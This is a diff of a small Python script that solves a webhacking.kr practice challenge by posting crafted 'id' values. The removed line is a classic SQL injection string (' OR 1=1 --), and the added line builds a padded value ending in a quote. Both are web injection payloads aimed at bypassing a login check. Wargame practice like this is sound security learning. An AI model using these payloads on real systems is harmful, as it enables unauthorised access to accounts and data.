@@ -1,13 +1,15 @@
 import requests
 
-url = "https://webhacking.kr/challenge/bonus-10/index.php"
+URL = "https://webhacking.kr/challenge/bonus-10/"
+SESSION_ID = "123"
+cookies = {'PHPSESSID':SESSION_ID}
 
-crack = '''\' OR 1=1 -- '''
+crack = 'guest' + 9*' ' + '\''
 
 
 data = { "id": crack }
     
-response = requests.post(url, data=data)                                
+response = requests.post(url=URL, cookies=cookies, data=data)                                
 
 print(response.text)
 
